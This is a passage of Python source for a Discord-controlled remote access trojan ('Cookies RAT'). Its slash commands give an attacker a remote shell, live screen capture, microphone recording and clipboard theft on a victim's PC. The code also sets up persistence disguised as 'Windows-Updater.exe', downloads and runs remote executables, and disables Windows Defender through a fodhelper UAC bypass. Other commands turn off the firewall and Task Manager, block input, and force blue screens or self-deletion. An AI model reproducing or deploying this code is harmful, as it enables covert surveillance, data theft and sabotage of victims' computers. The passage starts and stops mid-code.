            await ctx.send(embed=my_embed)


@slash.slash(name="TaskKill", description="kill any of their task, add the .exe etc to the end", guild_ids=g)
async def TaskKill_command(ctx: SlashContext, tasktokill: str):
    if ctx.channel.name == channel_name:
        try:
            os.system(f"taskkill /F /IM {tasktokill}")
            my_embed = discord.Embed(title=f"{tasktokill} killed succesfully", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="OpenPortScan", description="scan victims local/public IP address for open ports", guild_ids=g)
async def OpenPortScan_command(ctx: SlashContext, ip: str, starting_port: int, ending_port: int, thread_amount: int):
    if ctx.channel.name == channel_name:
        try:
            # ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            target = ip
            queue = Queue()
            open_ports = []

            def portscan(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target, port))
                    return True
                except:
                    return False

            def get_ports(starting_port, ending_port):
                for port in range(starting_port, ending_port):
                    queue.put(port)
                

            def worker():
                while not queue.empty():
                    port = queue.get()
                    if portscan(port):
                        open_ports.append(port)

            async def run_scanner(thread_amount, starting_port, ending_port):

                get_ports(starting_port, ending_port)

                thread_list = []

                for t in range(thread_amount):
                    thread = threading.Thread(target=worker)
                    thread_list.append(thread)

                for thread in thread_list:
                    thread.start()

                for thread in thread_list:
                    thread.join()

                my_embed = discord.Embed(title=f"Open ports are: {open_ports}", color=0x00FF00)
                await ctx.send(embed=my_embed)

            my_embed = discord.Embed(title=f"Scanning ports, please wait", color=0x3A3636)
            await ctx.send(embed=my_embed)
            await run_scanner(thread_amount, starting_port, ending_port)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="StreamScreen", description="Stream screen, time format (hh:mm:ss)", guild_ids=g)
async def StreamScreen_command(ctx: SlashContext, stream_time: str):
    if ctx.channel.name == channel_name:
        try:
            def convert_seconds(time_str):
                # split in hh, mm, ss
                hh, mm, ss = time_str.split(':')
                return int(hh) * 3600 + int(mm) * 60 + int(ss)

            time_length = stream_time 
            seconds_length = convert_seconds(time_length) 
            global end
            end = time.time() + seconds_length

            async def StreamScreen(end):
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\\hobos\\hellos.txt"        
                if os.path.isfile(hellos):
                    os.system(r"del %temp%\\hobos\\hellos.txt /f")
                    os.system(r"RMDIR %temp%\\hobos /s /q")     
                else:
                    pass
                while time.time() < end:
                    ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
                    screen = pyautogui.screenshot()
                    screen.save(temp + r"\\monitor.png")
                    path = temp + r"\\monitor.png"
                    file = discord.File((path), filename="monitor.png")
                    await ctx.send(file=file)
                    hellos = temp + r"\\hobos\\hellos.txt"
                    if os.path.isfile(hellos):
                        break
                    else:
                        continue

                if time.time() > end:
                    my_embed = discord.Embed(title=f"Finshed streaming screen", color=0x00FF00)
                    await ctx.send(embed=my_embed)
            
            my_embed = discord.Embed(title=f"Streaming screen for {seconds_length} Seconds", color=0x00FF00)
            await ctx.send(embed=my_embed)
            await StreamScreen(end)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="HideRAT", description="Hides the file by changing the attribute to hidden", guild_ids=g)
async def HideRAT_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib +h "{}" """.format(cmd237))
            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="UnHideRAT", description="UnHides the file by removing the hidden attribute", guild_ids=g)
async def UnHideRAT_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib -h "{}" """.format(cmd237))
            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
async def Shell_command(ctx: SlashContext, command: str):
    if ctx.channel.name == channel_name:
        try:
            global status
            status = None
            instruction = command
            def shell(command):
                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output.stdout.decode('CP437').strip()
            out = shell(instruction)
            print(out)
            print(status)
            if status:
                numb = len(out)
                if numb < 1:
                    my_embed = discord.Embed(title=f"Command not recognized or no output was obtained", color=0xFF0000)
                    await ctx.send(embed=my_embed)
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    f1 = open(temp + r"\\output.txt", 'a')
                    f1.write(out)
                    f1.close()
                    file = discord.File(temp + r"\\output.txt", filename="output.txt")
                    my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
                    await ctx.send(embed=my_embed)
                    await ctx.send(file=file)
                    os.remove(temp + r"\\output.txt")
                else:
                    my_embed = discord.Embed(title=f"Command executed : {out}", color=0x00FF00)
                    await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Command not recognized or no output was obtained", color=0xFF0000)
                await ctx.send(embed=my_embed)
                status = None
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
async def Write_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title=f"Typing. . .", color=0x00FF00)
            await ctx.send(embed=my_embed)
            for letter in message:
                pyautogui.typewrite(letter);sleep(0.0001)
            my_embed = discord.Embed(title=f"Done typing\n\n{message}", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Shutdown", description="Shuts down the users pc", guild_ids=g)
async def Shutdown_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            uncritproc()
            os.system("shutdown /p")
            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Restart", description="Restarts the users pc", guild_ids=g)
async def Restart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            uncritproc()
            os.system("shutdown /r /t 00")
            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="LogOff", description="Logs the user of", guild_ids=g)
async def LogOff_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            uncritproc()
            os.system("shutdown /l /f")
            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="DeleteFile", description="Permanently deletes file on the users pc, just POOF", guild_ids=g)
async def DeleteFile_command(ctx: SlashContext, filedirectory: str):
    if ctx.channel.name == channel_name:
        try:
            global statue
            instruction = (filedirectory)
            instruction = "del " + '"' + instruction + '"' + " /F"
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            global statue
            statue = "ok"
            if statue:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb > 0:
                    my_embed = discord.Embed(title=f"Error occured", color=0xFF0000)
                    await ctx.send(embed=my_embed)
                else:
                    my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
                    await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Command not recognized or no output was obtained", color=0xFF0000)
                await ctx.send(embed=my_embed)
                statue = None
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="BlueScreen", description="Bluescreens the user", guild_ids=g)
async def BlueScreen_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        
        my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
        await ctx.send(embed=my_embed)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))


@slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
async def Clipboard_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            my_embed = discord.Embed(title=f"Their Current Clipboard is:\n{data}", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="AdminCheck", description=f"check if Cookies RAT has admin perms", guild_ids=g)
async def AdminCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                my_embed = discord.Embed(title=f"RAT Has Admin privileges", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"RAT does not have admin privileges", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="CritProc", description=f"Bluescreens the user if RAT is closed", guild_ids=g)
async def CritProc_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        try:
            if isAdmin():
                critproc()
                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="UnCritProc", description=f"Turns off CritProc", guild_ids=g)
async def UnCritProc_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        try:
            if isAdmin():
                uncritproc()
                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
async def IdleTime_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            class LASTINPUTINFO(ctypes.Structure):
                    _fields_ = [
                        ('cbSize', ctypes.c_uint),
                        ('dwTime', ctypes.c_int),
                    ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
                if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
                    millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            duration = get_idle_duration()
            my_embed = discord.Embed(title=f"User idle for {duration:.2f} seconds.", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
async def BlockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ctypes.windll.user32.BlockInput(True)
                my_embed = discord.Embed(title=f"Blocked {os.getlogin()}'s keyboard and mouse", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
async def UnblockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ctypes.windll.user32.BlockInput(False)
                my_embed = discord.Embed(title=f"Unblocked {os.getlogin()}'s keyboard and mouse", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)
            

@slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
async def MessageBox_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title=f"Message box sent with message: {message}", color=0x00FF00)
            await ctx.send(embed=my_embed)
            print(pyautogui.alert(f"{message}"))
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Persistence", description="make rat persist of the victims PC", guild_ids=g)
async def Persistence_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
            if not os.path.exists(backdoor_location):
                shutil.copyfile(sys.executable, backdoor_location)
                sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
                my_embed = discord.Embed(title=f"Persistent update created on Agent", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                os.remove(backdoor_location)
                shutil.copyfile(sys.executable, backdoor_location)
                sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
                my_embed = discord.Embed(title=f"Persistent update created on Agent", color=0x00FF00)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="RecordAudio", description="record a 10s audio from the victim mic", guild_ids=g)
async def RecordAudio_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            

            temp = (os.getenv("temp") + '\\Audio.wav')
            fs = 44100  # Sample rate
            seconds = 10  # Duration of recording

            await ctx.send("Starting recorder. . .")

            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(temp, fs, myrecording)
            file = discord.File(temp, filename="Morris.wav")
            my_embed = discord.Embed(title=f"Successfully recorded audio", color=0x00FF00)
            await ctx.send(embed=my_embed)
            await ctx.send(file=file)
            os.remove(temp)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
async def Startup_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:  
                path = sys.argv[0]
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if isexe:
                    os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
                else:
                    os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
                    e = r"""
    Set objShell = WScript.CreateObject("WScript.Shell")
    objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
    """.format(os.path.basename(sys.argv[0]))
                    with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                        f.write(e)
                        f.close()
                my_embed = discord.Embed(title=f"Successfully added to startup", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="GrabData", description="Grabs ALL browser data using builded add on", guild_ids=g)
async def GrabData_command(ctx: SlashContext, download_link_url: str):
    if ctx.channel.name == channel_name:
        await ctx.send("Attempting to download and start data grabber. . .")
        temp = (os.getenv("temp"))

        try:
            #? Create cache folder
            if os.path.exists(f'{temp}\\$~cache'):
                pass
            else:
                os.mkdir(f'{temp}\$~cache')

            #? Download DataGrabber
            url = download_link_url
            r = requests.get(f"{url}")
            with open(f'{temp}\\$~cache\\ds.exe', 'wb') as f:
                f.write(r.content)
            f.close()

            #? Run DataGrabber
            os.startfile(f'{temp}\\$~cache\\ds.exe')
            my_embed = discord.Embed(title=f"Data grabber started successfully", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)
        

@slash.slash(name="StartProc", description="Starts process using DIR", guild_ids=g)
async def StartProc_command(ctx: SlashContext, dirtofile: str):
    if ctx.channel.name == channel_name:
        try:
            os.startfile(dirtofile)
            my_embed = discord.Embed(title=f"Succesfully started process from DIR {dirtofile}", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="SelfDestruct", description="Delete all traces of RAT on users PC", guild_ids=g)
async def SelfDestruct_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title=f"Self destructing RAT", color=0x3A3636)
            await ctx.send(embed=my_embed)
            uncritproc()
            pid = os.getpid()
            temp = (os.getenv("temp"))
            cwd2 = sys.argv[0]
            ######? Kill running RAT and then delete the file then make the bat file delete itself ######
            data = f"Killed Rat PID: {pid}\n\nRemoved Rat file"
            my_embed = discord.Embed(title=f"Self Destruct Complete", description=f"{data}", color=0x00FF00)
            await ctx.send(embed=my_embed)
            bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
            temp6 = temp + r"\\kill.bat"
            if os.path.isfile(temp6):
                os.remove(temp6)
            f6 = open(temp + r"\\kill.bat", 'w')
            f6.write(bat)
            f6.close()
            os.system(r"start /min %temp%\\kill.bat")
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Update", description="Replace old RAT version with new version", guild_ids=g)
async def Update_command(ctx: SlashContext, updated_version_url: str):
    if ctx.channel.name == channel_name:
        try:
            uncritproc()
            cwd = os.getcwd()
            name = os.path.splitext(os.path.basename(__file__))[0]
            cwd2 = sys.argv[0]
            pid = os.getpid()
            temp = (os.getenv("temp"))

            my_embed = discord.Embed(title=f"Updating please wait for new session! eta. 30-60 secs", color=0x00FF00)
            await ctx.send(embed=my_embed)

            #######? Download File #######
            url = updated_version_url
            r = requests.get(f"{url}")
            with open(f'{cwd}\\${name}.exe', 'wb') as f:
                f.write(r.content)
            f.close()

            #? Create batch file in temp folder to kill current RAT PID and then delete it after that then run the new rat version 
            bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 2 > NUL\n' + f'start "" "{cwd}\\${name}.exe"\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
            temp6 = temp + r"\\Update.bat"
            if os.path.isfile(temp6):
                os.remove(temp6)
            with open(temp + r"\\Update.bat", 'w') as f6:
                f6.write(bat)
            f6.close()
            os.system(r"start /min %temp%\\Update.bat")
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="StartWebsite", description="Start website link on users PC", guild_ids=g)
async def StartWebsite_command(ctx: SlashContext, chosen_website: str):
    if ctx.channel.name == channel_name: 
        try:
            website = chosen_website
            def OpenBrowser(URL):
                if not URL.startswith('http'):
                    URL = 'http://' + URL
                subprocess.call('start ' + URL, shell=True) 
            OpenBrowser(website)
            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)  


@slash.slash(name="DisableTaskManager", description="Disable victims task manager", guild_ids=g)
async def DisableTaskManager_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statuuusss
                statuuusss = None
                instruction = r'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statuuusss = "ok"
                    return output
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    
                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
                    os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
                else:
                    os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
                await ctx.send("")
                my_embed = discord.Embed(title=f"Successfully disabled victims task manager", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="DisableAntivirus", description="Disable victims antivirus", guild_ids=g)
async def DisableAntivirus_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            my_embed = discord.Embed(title=f"Attempting to disable windows antivirus", color=0x00FF00)
            await ctx.send(embed=my_embed)

            ###### CREATE BATCH FILE ######
            temp = (os.getenv("temp"))
            bat = """
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
    cls
    rem 0 - Disable Logging
    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
    cls
    rem Disable WD Tasks
    schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
    cls 
    rem Disable WD systray icon
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
    cls
    rem Remove WD context menu
    reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
    reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
    reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
    cls
    rem Disable WD services
    reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
    cls
            """
            temp2 = temp + r"\\av.bat"
            if os.path.isfile(temp2):
                os.remove(temp2)
            f6 = open(temp + r"\\av.bat", 'w')
            f6.write(bat)
            f6.close()

            ###### FORCE RUN BATCH FILE AS ADMIN ######
            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Disablefirewall", description="Disable victims firewall", guild_ids=g)
async def Disablefirewall_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                os.system("NetSh Advfirewall set allprofiles state off")
                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
